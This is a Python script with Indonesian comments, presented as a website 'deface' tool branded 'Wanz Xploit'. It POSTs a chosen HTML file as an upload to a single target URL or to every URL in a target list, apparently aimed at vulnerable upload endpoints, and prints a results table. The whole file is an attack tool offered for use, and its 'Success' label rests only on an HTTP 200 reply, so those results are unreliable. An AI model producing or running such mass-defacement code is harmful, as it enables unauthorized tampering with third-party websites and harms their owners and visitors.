import os
import time
import requests
from requests.exceptions import RequestException
import socket

# Fungsi untuk menampilkan separator dengan efek
def print_separator():
    separator = "█ █ " * 12  # Mengatur separator dengan jarak antar karakter
    print(f"\033[1;31m{' ' * 4}{separator.strip()}\033[0m")  # Menambahkan warna merah dan jarak

# Clear screen untuk fokus pada tools
os.system('clear')

# Fungsi untuk mendapatkan IP address lokal
def get_ip():
    hostname = socket.gethostname()
    ip_address = socket.gethostbyname(hostname)
    return ip_address

# Menampilkan banner dengan efek animasi
def animated_banner():
    banner = """
    \033[1;31m
    ███████╗   ██████╗ ███████╗███████╗
    ╚══██╔══╝   ██╔══██╗██╔════╝██╔════╝
       ██║█████╗██║  ██║█████╗  █████╗  
       ██║╚════╝██║  ██║██╔══╝  ██╔══╝  
       ██║      ██████╔╝███████╗██║     
       ╚═╝      ╚═════╝ ╚══════╝╚═╝     
    \033[0m
    \033[1;31mTOOLS DEFACE\033[0m
    \033[1;32mBy Wanz Xploit \033[1;34m| \033[4m[Hacking Techniques]\033[0m

    \033[1;31mFollow me on:\033[0m
    \033[1;33mInstagram: \033[4mhttps://www.instagram.com/wanz_xploit/\033[0m
    \033[1;33mYouTube: \033[4mhttps://www.youtube.com/c/wanzxploit/\033[0m
    \033[1;33mGitHub: \033[4mhttps://github.com/wanzxploit\033[0m
    """
    print(banner)
    print_separator()
    print("\n")  # Menambahkan spasi agar jarak lebih rapi

# Menampilkan animasi loading
def loading_animation():
    animation = ["|", "/", "-", "\\"]
    for i in range(10):
        for symbol in animation:
            print(f"\033[1;31mDefacing {symbol}\033[0m", end="\r")  # Ganti kata Uploading ke Defacing
            time.sleep(0.2)

# Input nama file script HTML
def get_file_input():
    filename = input("\033[1;32mMasukkan nama file script HTML: \033[0m")
    return filename

# Cek keberadaan file
def check_file(filepath):
    if not os.path.isfile(filepath):
        print(f"\033[0;31mFile {filepath} tidak ditemukan.\033[0m")
        exit(1)

# Baca file target.txt
def read_targets():
    with open("target.txt", "r") as file:
        return file.readlines()

# Menghapus duplikat URL
def remove_duplicates(targets):
    return list(set(targets))  # Menghapus URL yang sama

# Fungsi untuk deface tunggal
def deface_single():
    print("\033[1;33mMode Deface Tunggal\033[0m")
    target = input("\033[1;32mMasukkan URL target: \033[0m")
    filename = get_file_input()
    
    # Cek apakah URL valid
    if not target.startswith("http://") and not target.startswith("https://"):
        print("\033[0;31mURL tidak valid. Pastikan URL diawali dengan http:// atau https://.\033[0m")
        return

    filepath = f"/storage/emulated/0/{filename}"
    check_file(filepath)

    print(f"\033[1;32mMemulai deface ke {target}...\033[0m")
    upload_file([target], filepath)

# Fungsi untuk deface multi
def deface_multi():
    print("\033[1;33mMode Deface Multi\033[0m")
    filename = get_file_input()

    # Cek apakah file target.txt ada
    if not os.path.isfile("target.txt"):
        print("\033[0;31mFile target.txt tidak ditemukan.\033[0m")
        return

    targets = read_targets()
    targets = remove_duplicates(targets)  # Hapus URL yang sama

    print("\033[1;31mPeringatan: target.txt sudah ada sejak 2019, kemungkinan banyak target tidak aktif.\033[0m")
    print(f"\033[1;33mTotal Target URL: {len(targets)}\033[0m")
    
    filepath = f"/storage/emulated/0/{filename}"
    check_file(filepath)

    print(f"\033[1;32mMemulai deface ke {len(targets)} target...\033[0m")
    upload_file(targets, filepath)

# Loop untuk upload ke setiap target
def upload_file(targets, filepath):
    try:
        ip_address = get_ip()
        print(f"\033[1;32mIP Address: {ip_address}\033[0m")
        
        # Menampilkan header tabel
        print("\033[1;33m\nHasil Deface Multi:\033[0m")
        print("\033[1;32m" + "-"*55 + "\033[0m")  # Mengurangi panjang garis pemisah
        print(f"\033[1;32m{'No.':<4} {'Target':<40} {'Status':<7}\033[0m")  # Menghapus kolom Link
        print("\033[1;32m" + "-"*55 + "\033[0m")
        
        # Looping melalui target dan upload
        for index, target in enumerate(targets, start=1):
            target = target.strip()  # Menghapus spasi di awal/akhir
            try:
                # Animasi loading sebelum upload
                loading_animation()

                # Mengunggah file menggunakan POST
                with open(filepath, 'rb') as f:
                    response = requests.post(target, files={'file': (os.path.basename(filepath), f)})

                # Menampilkan hasil dalam tabel
                if response.status_code == 200:
                    print(f"\033[0;32m{index:<4} {target:<40} {'Success':<7}\033[0m")
                else:
                    print(f"\033[0;31m{index:<4} {target:<40} {'Failed':<7}\033[0m")
            except RequestException:
                print(f"\033[0;31m{index:<4} {target:<40} {'Failed':<7}\033[0m")
    except KeyboardInterrupt:
        print("\n\033[1;35mOperasi dihentikan. Semoga hari Anda menyenankan!\033[0m")

# Menu utama
def main_menu():
    choice = input("\033[1;33mPilih Mode Deface:\033[0m\n1. Deface Tunggal\n2. Deface Multi\n\n\033[1;32mMasukkan pilihan (1/2): \033[0m")
    
    os.system('clear')  # Clear screen setelah memilih mode

    if choice == "1":
        animated_banner()  # Menampilkan banner
        deface_single()  # Jalankan deface tunggal
    elif choice == "2":
        animated_banner()  # Menampilkan banner
        deface_multi()  # Jalankan deface multi
    else:
        print("\033[0;31mPilihan tidak valid.\033[0m")

# Main program
def main():
    animated_banner()  # Menampilkan banner pertama kali
    main_menu()  # Pilih mode setelah banner

if __name__ == "__main__":
    main()